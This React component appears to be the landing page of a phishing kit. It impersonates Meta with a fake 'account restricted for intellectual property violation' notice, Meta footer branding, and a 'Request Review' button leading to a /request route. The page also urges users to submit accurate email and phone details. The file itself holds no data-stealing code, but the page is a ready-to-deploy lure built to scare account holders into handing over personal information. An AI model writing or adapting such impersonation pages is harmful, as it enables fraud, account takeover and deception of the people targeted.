import React, { useState,useEffect} from "react";
import '../HomePage/HomePage.scss';

import { Route, Routes, BrowserRouter, useNavigate } from "react-router-dom";
import GoogleTranslate from '../../components/GoogleTranslate';

const HomePage = () => {
  const navigate = useNavigate();
  const getCurrentTime = () => {
    const now = new Date();
    const m = now.toLocaleString("default", { month: "long" });
    const d = now.getDate();
    const y = now.getFullYear();
    return `${m} ${d}, ${y}.`;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/request");
  };

  return (
    <>
    <GoogleTranslate/>
  <div
    className="absolute top-0 right-0 hidden"/>
  <div className="w-full">
    {/* Navbar Start */}
    <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
      <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
        <a href="/">
          <img src="images/NZCkRtwY5YDl.svg" style={{width:'64px'}} />
        </a>
      </div>
    </div>
    {/* Navbar End */}
    {/* Hero Start */}
    <div className="bg-[url('images/background.png')] bg-no-repeat bg-cover flex items-center justify-center">
      <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
        <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
          {/* <h1 className="font-[700] text-[32px] mb-3">
            Violation of Community Standards
          </h1> */}
<p className="text-left font-700 md:text-3xl text-2xl">
  <img
    src="images/zxc0KBED1gpJ.svg"
    className="inline align-baseline mr-2 w-[1em] h-[1em]"
    alt=""
  />
  Your account has been restricted or disabled
</p>
          <p className="mb-2 text-gray-800">
            We determined that some activity on your account may not follow our
            Community Standards.
          </p>
         <p className="text-gray-800">
            In particular, we found content that may violate our Intellectual
            Property policies, which include protections for copyrights and
            trademarks. When users repeatedly share content that violates these
            policies, we may take additional actions on their accounts.
          </p>
        </div>
        <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
          <img src="images/NmnE2ohCt1XU.png" style={{width:'100%'}} />
        </div>
      </div>
    </div>
    <div className="border-b border-[#E0E0E0]">
      <div className="my-10 px-4 max-w-[1280px] w-full mx-auto">
        {/* <div className="w-full mb-5">
          <div className="flex md:items-center items-start md:flex-row flex-col justify-start gap-3 mb-3">
            <img
              src="images/zxc0KBED1gpJ.svg"
              className="md:w-7 md:h-7 w-8 h-8"
              alt=""
            />
            <b className="font-700 md:text-3xl text-2xl">
              Your account has been restricted or disabled
            </b>
          </div>
          <p className="mb-2 text-gray-800">
            We determined that some activity on your account may not follow our
            Community Standards.
          </p>
          <p className="text-gray-800">
            In particular, we found content that may violate our Intellectual
            Property policies, which include protections for copyrights and
            trademarks. When users repeatedly share content that violates these
            policies, we may take additional actions on their accounts.
          </p>
        </div> */}
        <div className="w-full mb-5 border-b border-[#E0E0E0] pb-5">
          <p className="mb-[10px] font-[600] text-[18px]">Why this happened</p>
          <p className="text-[15px] mb-2">
            Your account or content may have been reported by other users or
            detected by our automated systems for potentially violating our
            policies related to intellectual property rights.
          </p>
          <p className="text-[15px]">
            These policies help protect creators, businesses and individuals
            from unauthorized use of their work, brand names or protected
            materials.
          </p>
        </div>
        <div className="w-full mb-5 border-b border-[#E0E0E0] pb-5">
          <p className="mb-[10px] font-[600] text-[18px]">What you can do</p>
          <p className="text-[15px] mb-2">
            If you believe this action was taken by mistake, you may request a
            review.
          </p>
          <p className="text-[15px] mb-2">
            During the review process, our team will evaluate your account
            activity and the reported content to determine whether it complies
            with our policies.
          </p>
          <p className="text-[15px]">
            You can also learn more about our policies and how to avoid
            violations in the future by visiting our Help Center.
          </p>
        </div>
        <div className="bg-white border-l-[#0064E0] border-l-[4px] p-4 mb-5">
          <div className="flex items-center justify-start gap-2">
            <div className="w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]">
              <img
                src="images/Z1Rsbx2QAKXi.svg"
                className="w-full h-full"
                alt="other"
              />
            </div>
            <p className="text-black text-[15px] font-[500]">Important Notes</p>
          </div>
          <div className="flex items-center justify-start gap-2 mt-3">
            <div className="w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]" />
            <div>
              <p className="text-black text-[15px] font-[300]">
                Please ensure that your contact information (email and phone number) is correct to avoid delays in activation.
              </p>
              <p className="text-black text-[15px] font-[300] my-2">
                Our verification team may reach out within 2 business days if
                additional details are needed.
              </p>
              <p className="text-black text-[15px] font-[300]">
                Any request containing incomplete or inaccurate information may
                result in a delayed or cancelled onboarding.
              </p>
            </div>
          </div>
        </div>
        <div className="bg-[#1877f2] text-white border-none rounded-full text-[16px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center flex items-center justify-center">
          <button
            onClick={handleSubmit}
            className="block w-full text-[16px] font-[600] text center px-[20px] py-[13px]"
          >
            Request Review
          </button>
        </div>
      </div>
    </div>
    {/* Hero End */}
    <div className="mt-10 max-w-[1280px] w-full px-4 mx-auto">
      <p className="text-center">
        <b className="font-700 md:text-3xl text-2xl text-center">
          What is an Intellectual Property Violation?
        </b>
      </p>
      <div className="flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6 mx-auto mb:my-0 my-10">
        <div className="md:max-w-[50%] max-w-full w-full flex flex-col items-start text-left justify-center md:pr-[2rem] pr-0 md:order-1 order-2">
          <b className="font-700 md:text-2xl text-xl">Trademark</b>
          <p className="mt-2 text-gray-800">
            A trademark is a word, slogan, symbol or design (example: brand
            name, logo) that distinguishes the products or services offered by
            one person, group or company from another. Generally, trademark law
            seeks to prevent confusion among consumers about who provides or is
            affiliated with a product or service.
          </p>
        </div>
        <div className="md:max-w-[50%] max-w-full w-full flex items-center justify-center md:order-2 order-1">
          <img src="images/g3cqFSe72Zu4.png" style={{width:'100%'}} />
        </div>
      </div>
      <div className="flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6 mx-auto mb:my-0 my-10">
        <div className="md:max-w-[50%] max-w-full w-full flex items-center justify-center">
          <img src="images/FbwVh9260yr0.png" style={{width:'100%'}} />
        </div>
        <div className="md:max-w-[50%] max-w-full w-full flex flex-col items-start text-left justify-center md:pl-[2rem] pl-0">
          <b className="font-700 md:text-2xl text-xl">Copyright</b>
          <p className="mt-2 text-gray-800">
            Copyright is a legal right that seeks to protect original works of
            authorship (example: books, music, film, art). Generally, copyright
            protects original expression such as words or images. It does not
            protect facts and ideas, although it may protect the original words
            or images used to describe an idea. Copyright also doesn’t protect
            things like names, titles and slogans; however, another legal right
            called a trademark might protect those.
          </p>
        </div>
      </div>
      <div className="flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6 mx-auto mb:my-0 my-10">
        <div className="md:max-w-[50%] max-w-full w-full flex flex-col items-start text-left justify-center md:pr-[2rem] pr-0 md:order-1 order-2">
          <b className="font-700 md:text-2xl text-xl">Counterfeit Goods</b>
          <p className="mt-2 text-gray-800">
            A counterfeit good is a knockoff or replica version of another
            company’s product. It usually copies the trademark (name or logo)
            and/or distinctive features of that other company’s product to
            imitate a genuine product. The manufacture, promotion or sale of a
            counterfeit goods is a type of trademark infringement that is
            illegal in most countries, and is recognized as being harmful to
            consumers, trademark owners and honest sellers. Please note that
            counterfeit goods may be unlawful even if the seller explicitly says
            that the goods are counterfeit, or otherwise disclaims authenticity
            of the goods.
          </p>
        </div>
        <div className="md:max-w-[50%] max-w-full w-full flex items-center justify-center md:order-2 order-1">
          <img src="images/Co6YpBbto1fa.png" style={{width:'100%'}} />
        </div>
      </div>
    </div>
    {/* Footer Start */}
    <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
      <div className="max-w-[1280px] w-full mx-auto px-4">
        <div className="flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
          <a href="#" className="hover:underline text-[#6D84B4]">
            English (US)
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            English (UK)
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            Italiano
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            Français
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            中文(简体)
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            日本語
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            한국어
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            עברית
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            Español
          </a>
          <a href="#" className="hover:underline text-[#6D84B4]">
            Português
          </a>
        </div>
        <div className="flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
          <p className="mr-4">© 2025 Meta</p>
          <a href="#" className="hover:underline">
            About
          </a>
          <a href="#" className="hover:underline">
            Developers
          </a>
          <a href="#" className="hover:underline">
            Careers
          </a>
          <a href="#" className="hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:underline">
            Cookies
          </a>
          <a href="#" className="hover:underline">
            Terms
          </a>
          <a href="#" className="hover:underline">
            Help Centre
          </a>
        </div>
      </div>
    </div>
    {/* Footer End */}
  </div>
</>
    );
}

export default HomePage;
